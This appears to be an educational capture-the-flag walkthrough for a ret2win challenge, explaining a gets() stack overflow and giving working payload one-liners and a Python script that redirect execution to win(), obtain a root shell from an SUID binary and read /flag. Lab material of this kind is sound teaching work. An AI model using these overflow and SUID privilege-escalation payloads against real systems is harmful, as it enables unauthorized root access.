# ğŸ¯ Dojo 1: ret2win Exploitation Guide

This guide will walk you through exploiting the ret2win challenge to get the flag.

## ğŸ“š Understanding the Vulnerability

The challenge binary has a **buffer overflow** vulnerability:

```c
void vuln() {
    char buffer[64];
    gets(buffer);  // âš ï¸ No bounds checking!
}
```

The `gets()` function reads input without checking the buffer size, allowing us to:
1. Overflow the 64-byte buffer
2. Overwrite the saved base pointer (8 bytes)
3. Overwrite the return address (8 bytes)
4. Redirect execution to `win()`

## ğŸ” Step-by-Step Exploitation

### Step 1: Access Your Workspace Terminal

1. Start your workspace from the challenge page
2. Click the terminal URL (e.g., `http://127.0.0.1:30000`)
3. You should see a bash prompt as user `hacker`

### Step 2: Run the Challenge Binary

```bash
/challenge/challenge
```

**Output:**
```
Welcome to Dojo 1: ret2win!
==============================

This is a beginner-friendly buffer overflow challenge.
Your goal: overflow the buffer and redirect execution to the win() function.

win() function is located at: 0x4011e6

Enter your input:
```

**ğŸ“ Note the address!** In this example, `win()` is at `0x4011e6`. Your address might be different.

### Step 3: Generate the Exploit Payload

You have **three options** to generate the payload:

---

#### **Option A: Using the Exploit Script (Easiest)**

```bash
# Interactive mode
python3 /exploit.py

# Or with address as argument
python3 /exploit.py 0x4011e6 | /challenge/challenge
```

---

#### **Option B: One-Liner (Quick)**

Replace `0x4011e6` with YOUR address from Step 2:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + (0x4011e6).to_bytes(8, "little"))' | /challenge/challenge
```

---

#### **Option C: Manual Python Script**

Create a file `exploit.py`:

```python
import sys

# Replace with YOUR address
win_addr = 0x4011e6

# Create payload
padding = b"A" * 72
ret_addr = win_addr.to_bytes(8, 'little')
payload = padding + ret_addr

# Output to stdout
sys.stdout.buffer.write(payload)
```

Run it:
```bash
python3 exploit.py | /challenge/challenge
```

---

### Step 4: Get Root Shell

When the exploit works, you'll see:

```
ğŸ‰ Congratulations! You called the win() function!
Spawning a root shell...

#
```

Notice the prompt changed from `$` to `#` - you're now **root**!

### Step 5: Read the Flag

```bash
cat /flag
```

**Output:**
```
flag{dojo1-ret2win:1:a1b2c3d4e5f6a7b8}
```

### Step 6: Submit the Flag

1. Copy the flag
2. Go back to the challenge page
3. Paste it in the "Submit Flag" form
4. Click "Submit Flag"
5. You should see "Solved âœ…"

## ğŸ§® Payload Breakdown

Let's understand the payload structure:

```
[AAAA...AAAA][BBBBBBBB][win_addr]
 64 bytes      8 bytes   8 bytes
 buffer        saved RBP return addr
```

- **72 bytes of 'A'**: Fills the buffer (64) + saved RBP (8)
- **8 bytes address**: Overwrites the return address with `win()`
- **Little-endian**: x86-64 uses little-endian byte order

### Example with address `0x4011e6`:

```python
payload = b"A" * 72 + b"\xe6\x11\x40\x00\x00\x00\x00\x00"
#                      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
#                          0x4011e6 in little-endian
```

## ğŸ› ï¸ Troubleshooting

### "Segmentation fault" without root shell

**Problem**: The address is incorrect or payload is malformed.

**Solution**:
1. Double-check the address from the challenge output
2. Ensure you're using little-endian byte order
3. Verify payload size is exactly 80 bytes (72 + 8)

### "Permission denied" when reading /flag

**Problem**: You're not root yet.

**Solution**:
1. Verify you see `#` prompt (not `$`)
2. Run `id` - should show `uid=0(root)`
3. If not, the exploit didn't work - check the address

### Challenge binary not found

**Problem**: Wrong path or container not set up correctly.

**Solution**:
```bash
ls -la /challenge/
# Should show the challenge binary with SUID bit (rwsr-xr-x)
```

## ğŸ“ Learning Points

This challenge teaches:

1. **Buffer Overflow**: How unchecked input can overwrite memory
2. **Stack Layout**: Understanding stack frames and return addresses
3. **Control Flow Hijacking**: Redirecting execution to arbitrary code
4. **SUID Exploitation**: How SUID binaries can escalate privileges
5. **Little-Endian**: Byte ordering in x86-64 architecture

## ğŸ” Why This Works

1. The binary is **SUID root** (`-rwsr-xr-x`)
2. When `win()` is called, it runs as root
3. `win()` calls `setuid(0)` to become root
4. Then spawns a shell with `execl("/bin/sh")`
5. The shell inherits root privileges

## ğŸ“– Further Reading

- [Buffer Overflow Basics](https://en.wikipedia.org/wiki/Buffer_overflow)
- [Return-to-libc Attack](https://en.wikipedia.org/wiki/Return-to-libc_attack)
- [SUID Exploitation](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)

## ğŸš€ Quick Reference Card

```bash
# 1. Run challenge to get address
/challenge/challenge

# 2. Generate and run exploit (replace ADDRESS)
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + (ADDRESS).to_bytes(8, "little"))' | /challenge/challenge

# 3. Read flag as root
cat /flag

# 4. Submit flag on website
```

---

**Happy hacking!** ğŸ¥‹
